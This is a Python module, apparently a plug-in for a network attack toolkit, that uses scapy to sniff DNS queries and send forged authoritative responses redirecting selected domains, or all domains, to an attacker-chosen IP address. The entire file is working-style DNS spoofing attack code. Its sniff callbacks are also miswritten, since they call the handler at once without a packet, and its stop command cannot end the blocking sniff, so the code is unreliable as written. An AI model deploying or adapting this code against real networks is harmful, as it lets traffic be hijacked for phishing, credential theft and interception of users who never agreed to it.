

from base_module import BaseModule
from message_broker import Message
from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP
from Network_Modules import network_adapter as iface
import threading

class DNSModule(BaseModule):
    def __init__(self):
        super().__init__("dns")

        # Module state
        self.is_spoofing = False
        self.target_address = None
        self.domain_spoof_list = None

        # Register command handlers
        self.register_handler("spoof_selected", self.handle_spoof_selected)
        self.register_handler("spoof_all", self.handle_spoof_all)
        self.register_handler("stop", self.handle_stop)

    def on_start(self):
        """Initialize module"""
        print(f"[{self.module_name}] DNS module initialized")

        # Ensure adapter is in managed mode
        if iface.ADAPTER_STATUS == "monitor":
            iface.set_adapter_status("managed")

    def on_stop(self):
        """Cleanup module"""
        if self.is_spoofing:
            self.stop_spoofing()

    # Command Handlers
    def hijack_dns_request(self, packet, any=False, domain=None):
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # If it's a DNS query (not a response)
            if (any):
                domain = packet[DNSQR].qname.decode()

            # Construct a fake DNS response
            response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                       UDP(dport=packet[UDP].sport, sport=53) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, ancount=1,
                           an=DNSRR(rrname=domain, rdata=self.target_address))

            for i in range(8):
                send(response, verbose=0)

    def handle_spoof_selected(self, message: Message):
        self.target_address = message.data.get("target_ip")
        self.domain_spoof_list = message.data.get("spoof_targets")
        self.is_spoofing = True

        print(f"[{self.module_name}] Spoofed target address: {self.target_address}")
        # Create a thread to run the server
        spoof_thread = threading.Thread(target=self._spoof_selected, daemon=True)
        spoof_thread.start()

        return {
            "status": "spoofing_selected"
        }

    def _spoof_selected(self):
        while self.is_spoofing:
            for domain in self.domain_spoof_list:
                sniff(filter="udp port 53", prn=self.hijack_dns_request(any=False, domain=domain), store=0)

    def handle_spoof_all(self, message: Message):
        self.target_address = message.data.get("target_ip")
        self.is_spoofing = True

        # Create a thread to run the server
        spoof_thread = threading.Thread(target=self._spoof_all, daemon=True)
        spoof_thread.start()

        return {
            "status": "spoofing_all",
        }

    def _spoof_all(self):
        while self.is_spoofing:
            sniff(filter="udp port 53", prn=self.hijack_dns_request(any=True), store=0)

    def handle_stop(self, message: Message):
        self.stop_spoofing()

        return {
            "status": "stopped",
        }

    def stop_spoofing(self):
        self.is_spoofing = False

# Global instance
_module = None

def get_module() -> DNSModule:
    global _module
    if _module is None:
        _module = DNSModule()
    return _module